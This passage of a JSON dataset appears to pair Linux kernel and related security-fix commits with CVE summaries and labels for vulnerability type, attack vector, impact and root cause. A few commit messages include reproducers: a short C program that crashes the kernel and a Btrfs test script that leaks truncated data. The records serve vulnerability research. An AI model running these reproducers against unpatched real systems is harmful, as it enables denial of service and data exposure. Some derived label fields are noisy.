attacker"},{"commit_id":"fdf5af0daf8019cec2396cdef8fb042d80fe71fa","cve_id":"CVE-2012-6638","cwe_id":"CWE-399","commit_message":"tcp: drop SYN+FIN messages\n\nDenys Fedoryshchenko reported that SYN+FIN attacks were bringing his\nlinux machines to their limits.\n\nDont call conn_request() if the TCP flags includes SYN flag\n\nReported-by: Denys Fedoryshchenko <denys@visp.net.lb>\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tcp_rcv_state_process function in net\/ipv4\/tcp_input.c in the Linux kernel before 3.2.24 allows remote attackers to cause a denial of service (kernel resource consumption) via a flood of SYN+FIN TCP packets, a different vulnerability than CVE-2012-2663.","commit_message_1":"drop syn+fin message denys fedoryshchenko reported that syn+fin attack were bringing his linux machine to their limit","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a flood of syn + fin tcp packets , a different vulnerability than cve - 2012 - 2663","Impact":"cause a denial of service ( kernel resource consumption )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"92e22ca23e52066da2258df8c76a2dca8a428bcc","cve_id":"CVE-2011-3602","cwe_id":"CWE-22","commit_message":"set_interface_var() doesn't check interface name and blindly does\nfopen(path \"\/\" ifname, \"w\") on it.  As \"ifname\" is an untrusted input, it\nshould be checked for \"..\" and\/or \"\/\" in it.  Otherwise, an infected\nunprivileged daemon may overwrite contents of file named \"mtu\",\n\"hoplimit\", etc. in arbitrary location with arbitrary 32-bit value in\ndecimal representation (\"%d\").  If an attacker has a local account or\nmay create arbitrary symlinks with these names in any location (e.g.\n\/tmp), any file may be overwritten with a decimal value.","summary":"Directory traversal vulnerability in device-linux.c in the router advertisement daemon (radvd) before 1.8.2 allows local users to overwrite arbitrary files, and remote attackers to overwrite certain files, via a .. (dot dot) in an interface name.  NOTE: this can be leveraged with a symlink to overwrite arbitrary files.","commit_message_1":"set_interface_var ( ) doe n't check interface name and blindly doe fopen ( path `` \/ '' ifname , `` w '' ) on it","Vulnerability Type":"Path Traversal","Attack Vector":"by creating a symbolic link from a temporary file to various files on the system","Impact":"overwrite arbitrary files , and remote attackers to overwrite certain files","Root Cause":"The set_interface_var() function creates temporary files insecurely","Attack Type":"local attacker"},{"commit_id":"7285477ab11831b1cf56e45878a89170dd06d9b9","cve_id":"CVE-2011-3346","cwe_id":"CWE-119","commit_message":"scsi-disk: lazily allocate bounce buffer\n\nIt will not be needed for reads and writes if the HBA provides a sglist.\nIn addition, this lets scsi-disk refuse commands with an excessive\nallocation length, as well as limit memory on usual well-behaved guests.\n\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\nSigned-off-by: Kevin Wolf <kwolf@redhat.com>","summary":"Buffer overflow in hw\/scsi-disk.c in the SCSI subsystem in QEMU before 0.15.2, as used by Xen, might allow local guest users with permission to access the CD-ROM to cause a denial of service (guest crash) via a crafted SAI READ CAPACITY SCSI command.  NOTE: this is only a vulnerability when root has manually modified certain permissions or ACLs.","commit_message_1":"lazily allocate bounce buffer it will not be needed for read and writes if the hba provides a sglist","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted sai read capacity scsi command","Impact":"access the cd - rom to cause a denial of service ( guest crash )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"819cbb120eaec7e014e5abd029260db1ca8c5735","cve_id":"CVE-2011-2909","cwe_id":"CWE-200","commit_message":"staging: comedi: fix infoleak to userspace\n\ndriver_name and board_name are pointers to strings, not buffers of size\nCOMEDI_NAMELEN.  Copying COMEDI_NAMELEN bytes of a string containing\nless than COMEDI_NAMELEN-1 bytes would leak some unrelated bytes.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nCc: stable <stable@kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@suse.de>","summary":"The do_devinfo_ioctl function in drivers\/staging\/comedi\/comedi_fops.c in the Linux kernel before 3.1 allows local users to obtain sensitive information from kernel memory via a copy of a short string.","commit_message_1":"comedi : fix infoleak to userspace driver_name and board_name are pointer to string , not buffer of size comedi_namelen","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a copy of a short string","Impact":"obtain sensitive information from kernel memory","Root Cause":"caused by a leak","Attack Type":"local attacker"},{"commit_id":"fc3a9157d3148ab91039c75423da8ef97be3e105","cve_id":"CVE-2010-5313","cwe_id":"CWE-362","commit_message":"KVM: X86: Don't report L2 emulation failures to user-space\n\nThis patch prevents that emulation failures which result\nfrom emulating an instruction for an L2-Guest results in\nbeing reported to userspace.\nWithout this patch a malicious L2-Guest would be able to\nkill the L1 by triggering a race-condition between an vmexit\nand the instruction emulator.\nWith this patch the L2 will most likely only kill itself in\nthis situation.\n\nSigned-off-by: Joerg Roedel <joerg.roedel@amd.com>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>","summary":"Race condition in arch\/x86\/kvm\/x86.c in the Linux kernel before 2.6.38 allows L2 guest OS users to cause a denial of service (L1 guest OS crash) via a crafted instruction that triggers an L2 emulation failure report, a similar issue to CVE-2014-7842.","commit_message_1":"x86 : do n't report l2 emulation failure to user-space this patch prevents that emulation failure which result from emulating an instruction for an l2-guest result in being reported to userspace","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted instruction that triggers an l2 emulation failure report , a similar issue to cve - 2014 - 7842","Impact":"cause a denial of service","Root Cause":"caused by a race condition","Attack Type":"attacker"},{"commit_id":"acff81ec2c79492b180fade3c2894425cd35a545","cve_id":"CVE-2015-8660","cwe_id":"CWE-264","commit_message":"ovl: fix permission checking for setattr\n\n[Al Viro] The bug is in being too enthusiastic about optimizing ->setattr()\naway - instead of \"copy verbatim with metadata\" + \"chmod\/chown\/utimes\"\n(with the former being always safe and the latter failing in case of\ninsufficient permissions) it tries to combine these two.  Note that copyup\nitself will have to do ->setattr() anyway; _that_ is where the elevated\ncapabilities are right.  Having these two ->setattr() (one to set verbatim\ncopy of metadata, another to do what overlayfs ->setattr() had been asked\nto do in the first place) combined is where it breaks.\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The ovl_setattr function in fs\/overlayfs\/inode.c in the Linux kernel through 4.3.3 attempts to merge distinct setattr operations, which allows local users to bypass intended access restrictions and modify the attributes of arbitrary overlay files via a crafted application.","commit_message_1":"fix permission checking for setattr [ al viro ] the bug is in being too enthusiastic about optimizing - > setattr ( ) away - instead of `` copy verbatim with metadata '' + `` chmod\/chown\/utimes '' ( with the former being always safe and the latter failing in case of insufficient permission ) it try to combine these two","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application","Impact":"bypass intended access restrictions and modify the attributes of arbitrary overlay files","Root Cause":"merge distinct setattr operations","Attack Type":"local attacker"},{"commit_id":"09ccfd238e5a0e670d8178cf50180ea81ae09ae1","cve_id":"CVE-2015-8569","cwe_id":"CWE-200","commit_message":"pptp: verify sockaddr_len in pptp_bind() and pptp_connect()\n\nReported-by: Dmitry Vyukov <dvyukov@gmail.com>\nSigned-off-by: Cong Wang <xiyou.wangcong@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The (1) pptp_bind and (2) pptp_connect functions in drivers\/net\/ppp\/pptp.c in the Linux kernel through 4.3.3 do not verify an address length, which allows local users to obtain sensitive information from kernel memory and bypass the KASLR protection mechanism via a crafted application.","commit_message_1":"pptp : verify sockaddr_len in pptp_bind ( ) and pptp_connect ( )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel memory and bypass the kaslr protection mechanism","Root Cause":"do not verify an address length","Attack Type":"local attacker"},{"commit_id":"79462ad02e861803b3840cc782248c7359451cd9","cve_id":"CVE-2015-8543","cwe_id":null,"commit_message":"net: add validation for the socket syscall protocol argument\n\n\u90ed\u6c38\u521a reported that one could simply crash the kernel as root by\nusing a simple program:\n\n\tint socket_fd;\n\tstruct sockaddr_in addr;\n\taddr.sin_port = 0;\n\taddr.sin_addr.s_addr = INADDR_ANY;\n\taddr.sin_family = 10;\n\n\tsocket_fd = socket(10,3,0x40000000);\n\tconnect(socket_fd , &addr,16);\n\nAF_INET, AF_INET6 sockets actually only support 8-bit protocol\nidentifiers. inet_sock's skc_protocol field thus is sized accordingly,\nthus larger protocol identifiers simply cut off the higher bits and\nstore a zero in the protocol fields.\n\nThis could lead to e.g. NULL function pointer because as a result of\nthe cut off inet_num is zero and we call down to inet_autobind, which\nis NULL for raw sockets.\n\nkernel: Call Trace:\nkernel:  [<ffffffff816db90e>] ? inet_autobind+0x2e\/0x70\nkernel:  [<ffffffff816db9a4>] inet_dgram_connect+0x54\/0x80\nkernel:  [<ffffffff81645069>] SYSC_connect+0xd9\/0x110\nkernel:  [<ffffffff810ac51b>] ? ptrace_notify+0x5b\/0x80\nkernel:  [<ffffffff810236d8>] ? syscall_trace_enter_phase2+0x108\/0x200\nkernel:  [<ffffffff81645e0e>] SyS_connect+0xe\/0x10\nkernel:  [<ffffffff81779515>] tracesys_phase2+0x84\/0x89\n\nI found no particular commit which introduced this problem.\n\nCVE: CVE-2015-8543\nCc: Cong Wang <cwang@twopensource.com>\nReported-by: \u90ed\u6c38\u521a <guoyonggang@360.cn>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The networking implementation in the Linux kernel through 4.3.3, as used in Android and other products, does not validate protocol identifiers for certain protocol families, which allows local users to cause a denial of service (NULL function pointer dereference and system crash) or possibly gain privileges by leveraging CLONE_NEWUSER support to execute a crafted SOCK_RAW application.","commit_message_1":"add validation for the socket syscall protocol argument \u90ed\u6c38\u521a reported that one could simply crash the kernel a root by using a simple program : int socket_fd ; struct sockaddr_in addr ; <file> = <number> ; <file>","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by leveraging clone _ newuser support to execute a crafted sock _ raw application","Impact":"cause a denial of service ( function pointer dereference and system crash ) or possibly gain privileges","Root Cause":"does not validate protocol identifiers for certain protocol families","Attack Type":"local attacker"},{"commit_id":"0305cd5f7fca85dae392b9ba85b116896eb7c1c7","cve_id":"CVE-2015-8374","cwe_id":"CWE-200","commit_message":"Btrfs: fix truncation of compressed and inlined extents\n\nWhen truncating a file to a smaller size which consists of an inline\nextent that is compressed, we did not discard (or made unusable) the\ndata between the new file size and the old file size, wasting metadata\nspace and allowing for the truncated data to be leaked and the data\ncorruption\/loss mentioned below.\nWe were also not correctly decrementing the number of bytes used by the\ninode, we were setting it to zero, giving a wrong report for callers of\nthe stat(2) syscall. The fsck tool also reported an error about a mismatch\nbetween the nbytes of the file versus the real space used by the file.\n\nNow because we weren't discarding the truncated region of the file, it\nwas possible for a caller of the clone ioctl to actually read the data\nthat was truncated, allowing for a security breach without requiring root\naccess to the system, using only standard filesystem operations. The\nscenario is the following:\n\n   1) User A creates a file which consists of an inline and compressed\n      extent with a size of 2000 bytes - the file is not accessible to\n      any other users (no read, write or execution permission for anyone\n      else);\n\n   2) The user truncates the file to a size of 1000 bytes;\n\n   3) User A makes the file world readable;\n\n   4) User B creates a file consisting of an inline extent of 2000 bytes;\n\n   5) User B issues a clone operation from user A's file into its own\n      file (using a length argument of 0, clone the whole range);\n\n   6) User B now gets to see the 1000 bytes that user A truncated from\n      its file before it made its file world readbale. User B also lost\n      the bytes in the range [1000, 2000[ bytes from its own file, but\n      that might be ok if his\/her intention was reading stale data from\n      user A that was never supposed to be public.\n\nNote that this contrasts with the case where we truncate a file from 2000\nbytes to 1000 bytes and then truncate it back from 1000 to 2000 bytes. In\nthis case reading any byte from the range [1000, 2000[ will return a value\nof 0x00, instead of the original data.\n\nThis problem exists since the clone ioctl was added and happens both with\nand without my recent data loss and file corruption fixes for the clone\nioctl (patch \"Btrfs: fix file corruption and data loss after cloning\ninline extents\").\n\nSo fix this by truncating the compressed inline extents as we do for the\nnon-compressed case, which involves decompressing, if the data isn't already\nin the page cache, compressing the truncated version of the extent, writing\nthe compressed content into the inline extent and then truncate it.\n\nThe following test case for fstests reproduces the problem. In order for\nthe test to pass both this fix and my previous fix for the clone ioctl\nthat forbids cloning a smaller inline extent into a larger one,\nwhich is titled \"Btrfs: fix file corruption and data loss after cloning\ninline extents\", are needed. Without that other fix the test fails in a\ndifferent way that does not leak the truncated data, instead part of\ndestination file gets replaced with zeroes (because the destination file\nhas a larger inline extent than the source).\n\n  seq=`basename $0`\n  seqres=$RESULT_DIR\/$seq\n  echo \"QA output created by $seq\"\n  tmp=\/tmp\/$$\n  status=1\t# failure is the default!\n  trap \"_cleanup; exit \\$status\" 0 1 2 3 15\n\n  _cleanup()\n  {\n      rm -f $tmp.*\n  }\n\n  # get standard environment, filters and checks\n  . .\/common\/rc\n  . .\/common\/filter\n\n  # real QA test starts here\n  _need_to_be_root\n  _supported_fs btrfs\n  _supported_os Linux\n  _require_scratch\n  _require_cloner\n\n  rm -f $seqres.full\n\n  _scratch_mkfs >>$seqres.full 2>&1\n  _scratch_mount \"-o compress\"\n\n  # Create our test files. File foo is going to be the source of a clone operation\n  # and consists of a single inline extent with an uncompressed size of 512 bytes,\n  # while file bar consists of a single inline extent with an uncompressed size of\n  # 256 bytes. For our test's purpose, it's important that file bar has an inline\n  # extent with a size smaller than foo's inline extent.\n  $XFS_IO_PROG -f -c \"pwrite -S 0xa1 0 128\"   \\\n          -c \"pwrite -S 0x2a 128 384\" \\\n          $SCRATCH_MNT\/foo | _filter_xfs_io\n  $XFS_IO_PROG -f -c \"pwrite -S 0xbb 0 256\" $SCRATCH_MNT\/bar | _filter_xfs_io\n\n  # Now durably persist all metadata and data. We do this to make sure that we get\n  # on disk an inline extent with a size of 512 bytes for file foo.\n  sync\n\n  # Now truncate our file foo to a smaller size. Because it consists of a\n  # compressed and inline extent, btrfs did not shrink the inline extent to the\n  # new size (if the extent was not compressed, btrfs would shrink it to 128\n  # bytes), it only updates the inode's i_size to 128 bytes.\n  $XFS_IO_PROG -c \"truncate 128\" $SCRATCH_MNT\/foo\n\n  # Now clone foo's inline extent into bar.\n  # This clone operation should fail with errno EOPNOTSUPP because the source\n  # file consists only of an inline extent and the file's size is smaller than\n  # the inline extent of the destination (128 bytes < 256 bytes). However the\n  # clone ioctl was not prepared to deal with a file that has a size smaller\n  # than the size of its inline extent (something that happens only for compressed\n  # inline extents), resulting in copying the full inline extent from the source\n  # file into the destination file.\n  #\n  # Note that btrfs' clone operation for inline extents consists of removing the\n  # inline extent from the destination inode and copy the inline extent from the\n  # source inode into the destination inode, meaning that if the destination\n  # inode's inline extent is larger (N bytes) than the source inode's inline\n  # extent (M bytes), some bytes (N - M bytes) will be lost from the destination\n  # file. Btrfs could copy the source inline extent's data into the destination's\n  # inline extent so that we would not lose any data, but that's currently not\n  # done due to the complexity that would be needed to deal with such cases\n  # (specially when one or both extents are compressed), returning EOPNOTSUPP, as\n  # it's normally not a very common case to clone very small files (only case\n  # where we get inline extents) and copying inline extents does not save any\n  # space (unlike for normal, non-inlined extents).\n  $CLONER_PROG -s 0 -d 0 -l 0 $SCRATCH_MNT\/foo $SCRATCH_MNT\/bar\n\n  # Now because the above clone operation used to succeed, and due to foo's inline\n  # extent not being shinked by the truncate operation, our file bar got the whole\n  # inline extent copied from foo, making us lose the last 128 bytes from bar\n  # which got replaced by the bytes in range [128, 256[ from foo before foo was\n  # truncated - in other words, data loss from bar and being able to read old and\n  # stale data from foo that should not be possible to read anymore through normal\n  # filesystem operations. Contrast with the case where we truncate a file from a\n  # size N to a smaller size M, truncate it back to size N and then read the range\n  # [M, N[, we should always get the value 0x00 for all the bytes in that range.\n\n  # We expected the clone operation to fail with errno EOPNOTSUPP and therefore\n  # not modify our file's bar data\/metadata. So its content should be 256 bytes\n  # long with all bytes having the value 0xbb.\n  #\n  # Without the btrfs bug fix, the clone operation succeeded and resulted in\n  # leaking truncated data from foo, the bytes that belonged to its range\n  # [128, 256[, and losing data from bar in that same range. So reading the\n  # file gave us the following content:\n  #\n  # 0000000 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1\n  # *\n  # 0000200 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a\n  # *\n  # 0000400\n  echo \"File bar's content after the clone operation:\"\n  od -t x1 $SCRATCH_MNT\/bar\n\n  # Also because the foo's inline extent was not shrunk by the truncate\n  # operation, btrfs' fsck, which is run by the fstests framework everytime a\n  # test completes, failed reporting the following error:\n  #\n  #  root 5 inode 257 errors 400, nbytes wrong\n\n  status=0\n  exit\n\nCc: stable@vger.kernel.org\nSigned-off-by: Filipe Manana <fdmanana@suse.com>","summary":"fs\/btrfs\/inode.c in the Linux kernel before 4.3.3 mishandles compressed inline extents, which allows local users to obtain sensitive pre-truncation information from a file via a clone action.","commit_message_1":"fix truncation of compressed and inlined extent when truncating a file to a smaller size which consists of an inline extent that is compressed , we did not discard ( or made unusable ) the data between the new file size and the old file size , wasting metadata space and allowing for the truncated data to be leaked and the data corruption\/loss mentioned below","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a clone action","Impact":"obtain sensitive pre - truncation information from a file","Root Cause":"mishandles compressed inline extents","Attack Type":"local attacker"},{"commit_id":"77751427a1ff25b27d47a4c36b12c3c8667855ac","cve_id":"CVE-2015-8215","cwe_id":"CWE-20","commit_message":"ipv6: addrconf: validate new MTU before applying it\n\nCurrently we don't check if the new MTU is valid or not and this allows\none to configure a smaller than minimum allowed by RFCs or even bigger\nthan interface own MTU, which is a problem as it may lead to packet\ndrops.\n\nIf you have a daemon like NetworkManager running, this may be exploited\nby remote attackers by forging RA packets with an invalid MTU, possibly\nleading to a DoS. (NetworkManager currently only validates for values\ntoo small, but not for too big ones.)\n\nThe fix is just to make sure the new value is valid. That is, between\nIPV6_MIN_MTU and interface's MTU.\n\nNote that similar check is already performed at\nndisc_router_discovery(), for when kernel itself parses the RA.\n\nSigned-off-by: Marcelo Ricardo Leitner <mleitner@redhat.com>\nSigned-off-by: Sabrina Dubroca <sd@queasysnail.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/ipv6\/addrconf.c in the IPv6 stack in the Linux kernel before 4.0 does not validate attempted changes to the MTU value, which allows context-dependent attackers to cause a denial of service (packet loss) via a value that is (1) smaller than the minimum compliant value or (2) larger than the MTU of an interface, as demonstrated by a Router Advertisement (RA) message that is not validated by a daemon, a different vulnerability than CVE-2015-0272.  NOTE: the scope of CVE-2015-0272 is limited to the NetworkManager product.","commit_message_1":"addrconf : validate new mtu before applying it currently we do n't check if the new mtu is valid or not and this allows one to configure a smaller than minimum allowed by rfcs or even bigger than interface own mtu , which is a problem a it may lead to packet drop","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a value that is ( 1 ) smaller than the minimum compliant value or ( 2 ) larger than the mtu of an interface , as demonstrated by a router advertisement ( ra ) message that is not validated by a daemon , a different vulnerability than cve - 2015","Impact":"cause a denial of service ( packet loss )","Root Cause":"does not validate attempted changes to the mtu value","Attack Type":"remote attacker"},{"commit_id":"cbdb967af3d54993f5814f1cee0ed311a055377d","cve_id":"CVE-2015-8104","cwe_id":"CWE-399","commit_message":"KVM: svm: unconditionally intercept #DB\n\nThis is needed to avoid the possibility that the guest triggers\nan infinite stream of #DB exceptions (CVE-2015-8104).\n\nVMX is not affected: because it does not save DR6 in the VMCS,\nit already intercepts #DB unconditionally.\n\nReported-by: Jan Beulich <jbeulich@suse.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The KVM subsystem in the Linux kernel through 4.2.6, and Xen 4.3.x through 4.6.x, allows guest OS users to cause a denial of service (host OS panic or hang) by triggering many #DB (aka Debug) exceptions, related to svm.c.","commit_message_1":"svm : unconditionally intercept # db this is needed to avoid the possibility that the guest trigger an infinite stream of # db exception ( <cve_id> )","Vulnerability Type":"Resource Management Errors","Attack Vector":"by triggering many # db ( aka debug ) exceptions , related to svm . c","Impact":"cause a denial of service ( host os panic or hang )","Root Cause":"caused by an error when processing a debug exception","Attack Type":"local attacker"},{"commit_id":"8c7188b23474cca017b3ef354c4a58456f68303a","cve_id":"CVE-2015-7990","cwe_id":"CWE-362","commit_message":"RDS: fix race condition when sending a message on unbound socket\n\nSasha's found a NULL pointer dereference in the RDS connection code when\nsending a message to an apparently unbound socket.  The problem is caused\nby the code checking if the socket is bound in rds_sendmsg(), which checks\nthe rs_bound_addr field without taking a lock on the socket.  This opens a\nrace where rs_bound_addr is temporarily set but where the transport is not\nin rds_bind(), leading to a NULL pointer dereference when trying to\ndereference 'trans' in __rds_conn_create().\n\nVegard wrote a reproducer for this issue, so kindly ask him to share if\nyou're interested.\n\nI cannot reproduce the NULL pointer dereference using Vegard's reproducer\nwith this patch, whereas I could without.\n\nComplete earlier incomplete fix to CVE-2015-6937:\n\n  74e98eb08588 (\"RDS: verify the underlying transport exists before creating a connection\")\n\nCc: David S. Miller <davem@davemloft.net>\nCc: stable@vger.kernel.org\n\nReviewed-by: Vegard Nossum <vegard.nossum@oracle.com>\nReviewed-by: Sasha Levin <sasha.levin@oracle.com>\nAcked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>\nSigned-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Race condition in the rds_sendmsg function in net\/rds\/sendmsg.c in the Linux kernel before 4.3.3 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by using a socket that was not properly bound.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2015-6937.","commit_message_1":"fix race condition when sending a message on unbound socket sasha 's found a null pointer dereference in the rds connection code when sending a message to an apparently unbound socket","Vulnerability Type":"Race Condition","Attack Vector":"by using a socket that was not properly bound","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"4b6184336ebb5c8dc1eae7f7ab46ee608a748b05","cve_id":"CVE-2015-7885","cwe_id":"CWE-200","commit_message":"staging\/dgnc: fix info leak in ioctl\n\nThe dgnc_mgmt_ioctl() code fails to initialize the 16 _reserved bytes of\nstruct digi_dinfo after the ->dinfo_nboards member. Add an explicit\nmemset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Salva Peir\u00f3 <speirofr@gmail.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The dgnc_mgmt_ioctl function in drivers\/staging\/dgnc\/dgnc_mgmt.c in the Linux kernel through 4.3.3 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel memory via a crafted application.","commit_message_1":"fix info leak in ioctl the dgnc_mgmt_ioctl ( ) code fails to initialize the <number> _reserved byte of struct digi_dinfo after the - > dinfo_nboards member","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not initialize a certain structure member","Attack Type":"local attacker"},{"commit_id":"eda98796aff0d9bf41094b06811f5def3b4c333c","cve_id":"CVE-2015-7884","cwe_id":"CWE-200","commit_message":"[media] media\/vivid-osd: fix info leak in ioctl\n\nThe vivid_fb_ioctl() code fails to initialize the 16 _reserved bytes of\nstruct fb_vblank after the ->hcount member. Add an explicit\nmemset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Salva Peir\u00f3 <speirofr@gmail.com>\nSigned-off-by: Hans Verkuil <hans.verkuil@cisco.com>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>","summary":"The vivid_fb_ioctl function in drivers\/media\/platform\/vivid\/vivid-osd.c in the Linux kernel through 4.3.3 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel memory via a crafted application.","commit_message_1":"fix info leak in ioctl the vivid_fb_ioctl ( ) code fails to initialize the <number> _reserved byte of struct fb_vblank after the - > hcount member","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not initialize a certain structure member ","Attack Type":"local attacker"},{"commit_id":"ce1fad2740c648a4340f6f6c391a8a83769d2e8c","cve_id":"CVE-2015-7872","cwe_id":"CWE-20","commit_message":"Merge branch 'keys-fixes' of git:\/\/git.kernel.org\/pub\/scm\/linux\/kernel\/git\/dhowells\/linux-fs\n\nPull key handling fixes from David Howells:\n \"Here are two patches, the first of which at least should go upstream\n  immediately:\n\n  (1) Prevent a user-triggerable crash in the keyrings destructor when a\n      negatively instantiated keyring is garbage collected.  I have also\n      seen this triggered for user type keys.\n\n  (2) Prevent the user from using requesting that a keyring be created\n      and instantiated through an upcall.  Doing so is probably safe\n      since the keyring type ignores the arguments to its instantiation\n      function - but we probably shouldn't let keyrings be created in\n      this manner\"\n\n* 'keys-fixes' of git:\/\/git.kernel.org\/pub\/scm\/linux\/kernel\/git\/dhowells\/linux-fs:\n  KEYS: Don't permit request_key() to construct a new keyring\n  KEYS: Fix crash when attempt to garbage collect an uninstantiated keyring","summary":"The key_gc_unused_keys function in security\/keys\/gc.c in the Linux kernel through 4.2.6 allows local users to cause a denial of service (OOPS) via crafted keyctl commands.","commit_message_1":"pull key handling fix from david howells : `` here are two patch , the first of which at least should go upstream immediately : ( <number> ) prevent a user-triggerable crash in the keyrings destructor when a negatively instantiated keyring is garbage collected","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted keyctl commands","Impact":"cause a denial of service ( oops )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"b9a532277938798b53178d5a66af6e2915cb27cf","cve_id":"CVE-2015-7613","cwe_id":"CWE-362","commit_message":"Initialize msg\/shm IPC objects before doing ipc_addid()\n\nAs reported by Dmitry Vyukov, we really shouldn't do ipc_addid() before\nhaving initialized the IPC object state.  Yes, we initialize the IPC\nobject in a locked state, but with all the lockless RCU lookup work,\nthat IPC object lock no longer means that the state cannot be seen.\n\nWe already did this for the IPC semaphore code (see commit e8577d1f0329:\n\"ipc\/sem.c: fully initialize sem_array before making it visible\") but we\nclearly forgot about msg and shm.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nCc: Manfred Spraul <manfred@colorfullife.com>\nCc: Davidlohr Bueso <dbueso@suse.de>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Race condition in the IPC object implementation in the Linux kernel through 4.2.3 allows local users to gain privileges by triggering an ipc_addid call that leads to uid and gid comparisons against uninitialized data, related to msg.c, shm.c, and util.c.","commit_message_1":"initialize msg\/shm ipc object before doing ipc_addid ( ) a reported by dmitry vyukov , we really should n't do ipc_addid ( ) before having initialized the ipc object state","Vulnerability Type":"Race Condition","Attack Vector":"by triggering an ipc _ addid call that leads to uid and gid comparisons against uninitialized data , related to msg . c , shm . c , and util . c","Impact":"gain privileges","Root Cause":"caused by the installation of a not-completely initialized object into the shared object table by the ipc_addid() function","Attack Type":"local attacker"},{"commit_id":"c9b92530a723ac5ef8e352885a1862b18f31b2f5","cve_id":"CVE-2015-7509","cwe_id":"CWE-20","commit_message":"ext4: make orphan functions be no-op in no-journal mode\n\nInstead of checking whether the handle is valid, we check if journal\nis enabled. This avoids taking the s_orphan_lock mutex in all cases\nwhen there is no journal in use, including the error paths where\next4_orphan_del() is called with a handle set to NULL.\n\nSigned-off-by: Anatol Pomozov <anatol.pomozov@gmail.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>","summary":"fs\/ext4\/namei.c in the Linux kernel before 3.7 allows physically proximate attackers to cause a denial of service (system crash) via a crafted no-journal filesystem, a related issue to CVE-2013-2015.","commit_message_1":"make orphan function be no-op in no-journal mode instead of checking whether the handle is valid , we check if journal is enabled","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted no - journal filesystem , a related issue to cve - 2013 - 2015","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"74e98eb085889b0d2d4908f59f6e00026063014f","cve_id":"CVE-2015-6937","cwe_id":null,"commit_message":"RDS: verify the underlying transport exists before creating a connection\n\nThere was no verification that an underlying transport exists when creating\na connection, this would cause dereferencing a NULL ptr.\n\nIt might happen on sockets that weren't properly bound before attempting to\nsend a message, which will cause a NULL ptr deref:\n\n[135546.047719] kasan: GPF could be caused by NULL-ptr deref or user memory accessgeneral protection fault: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC KASAN\n[135546.051270] Modules linked in:\n[135546.051781] CPU: 4 PID: 15650 Comm: trinity-c4 Not tainted 4.2.0-next-20150902-sasha-00041-gbaa1222-dirty #2527\n[135546.053217] task: ffff8800835bc000 ti: ffff8800bc708000 task.ti: ffff8800bc708000\n[135546.054291] RIP: __rds_conn_create (net\/rds\/connection.c:194)\n[135546.055666] RSP: 0018:ffff8800bc70fab0  EFLAGS: 00010202\n[135546.056457] RAX: dffffc0000000000 RBX: 0000000000000f2c RCX: ffff8800835bc000\n[135546.057494] RDX: 0000000000000007 RSI: ffff8800835bccd8 RDI: 0000000000000038\n[135546.058530] RBP: ffff8800bc70fb18 R08: 0000000000000001 R09: 0000000000000000\n[135546.059556] R10: ffffed014d7a3a23 R11: ffffed014d7a3a21 R12: 0000000000000000\n[135546.060614] R13: 0000000000000001 R14: ffff8801ec3d0000 R15: 0000000000000000\n[135546.061668] FS:  00007faad4ffb700(0000) GS:ffff880252000000(0000) knlGS:0000000000000000\n[135546.062836] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b\n[135546.063682] CR2: 000000000000846a CR3: 000000009d137000 CR4: 